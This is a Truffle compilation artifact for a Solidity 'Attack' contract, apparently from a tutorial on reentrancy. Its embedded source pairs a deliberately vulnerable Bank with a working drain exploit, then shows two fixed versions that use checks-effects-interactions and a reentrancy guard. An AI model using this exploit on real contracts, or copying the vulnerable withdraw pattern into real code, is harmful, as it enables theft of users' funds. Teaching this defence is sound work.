{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Bank",
          "name": "_bank",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract Bank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b50604051610563380380610563833981810160405281019061003191906100e5565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f80fd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b6104468061011d5f395ff3fe608060405260043610610037575f3560e01c806312065fe01461010257806376cdb03b1461012c5780639e5faafc14610156576100fe565b366100fe57670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100fc575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100e5575f80fd5b505af11580156100f7573d5f803e3d5ffd5b505050505b005b5f80fd5b34801561010d575f80fd5b50610116610160565b60405161012391906102ec565b60405180910390f35b348015610137575f80fd5b50610140610167565b60405161014d919061037f565b60405180910390f35b61015e61018a565b005b5f47905090565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000034146101d4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101cb906103f2565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610241575f80fd5b505af1158015610253573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bc575f80fd5b505af11580156102ce573d5f803e3d5ffd5b50505050565b5f819050919050565b6102e6816102d4565b82525050565b5f6020820190506102ff5f8301846102dd565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61034761034261033d84610305565b610324565b610305565b9050919050565b5f6103588261032d565b9050919050565b5f6103698261034e565b9050919050565b6103798161035f565b82525050565b5f6020820190506103925f830184610370565b92915050565b5f82825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b000000000000005f82015250565b5f6103dc601983610398565b91506103e7826103a8565b602082019050919050565b5f6020820190508181035f830152610409816103d0565b905091905056fea26469706673582212209e64caa0c60c24ca1481bf24d96829d398457539308fe32fa6d1e624523147fc64736f6c63430008140033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n// by 0xAA\r\npragma solidity ^0.8.4;\r\n\r\ncontract Bank {\r\n    mapping (address => uint256) public balanceOf;    // mapping\r\n\r\n    // ether\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    // msg.senderether\r\n    function withdraw() external {\r\n        // \r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n        //  ether !!! fallback/receive\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n        // \r\n        balanceOf[msg.sender] = 0;\r\n    }\r\n\r\n    // \r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    Bank public bank; // Bank\r\n\r\n    // Bank\r\n    constructor(Bank _bank) {\r\n        bank = _bank;\r\n    }\r\n    \r\n    // Bankwithdraw\r\n    receive() external payable {\r\n        if (address(bank).balance >= 1 ether) {\r\n            bank.withdraw();\r\n        }\r\n    }\r\n\r\n    //  msg.value  1 ether\r\n    function attack() external payable {\r\n        require(msg.value == 1 ether, \"Require 1 Ether to attack\");\r\n        bank.deposit{value: 1 ether}();\r\n        bank.withdraw();\r\n    }\r\n\r\n    // \r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\n//  --checks-effect-interaction\r\ncontract GoodBank {\r\n    mapping (address => uint256) public balanceOf;\r\n\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw() external {\r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n        // --checks-effect-interactionETH\r\n        // balanceOf[msg.sender]0\r\n        balanceOf[msg.sender] = 0;\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n    }\r\n\r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n\r\n//   \r\ncontract ProtectedBank {\r\n    mapping (address => uint256) public balanceOf;\r\n    uint256 private _status; // \r\n\r\n    // \r\n    modifier nonReentrant() {\r\n        //  nonReentrant _status  0\r\n        require(_status == 0, \"ReentrancyGuard: reentrant call\");\r\n        //  nonReentrant \r\n        _status = 1;\r\n        _;\r\n        //  _status 0\r\n        _status = 0;\r\n    }\r\n\r\n\r\n    function deposit() external payable {\r\n        balanceOf[msg.sender] += msg.value;\r\n    }\r\n\r\n    // \r\n    function withdraw() external nonReentrant{\r\n        uint256 balance = balanceOf[msg.sender];\r\n        require(balance > 0, \"Insufficient balance\");\r\n\r\n        (bool success, ) = msg.sender.call{value: balance}(\"\");\r\n        require(success, \"Failed to send Ether\");\r\n\r\n        balanceOf[msg.sender] = 0;\r\n    }\r\n\r\n    function getBalance() external view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n",
  "sourcePath": "/home/ap/truffleProject1/contracts/bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.a1b79de6.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-06-27T04:20:12.986Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}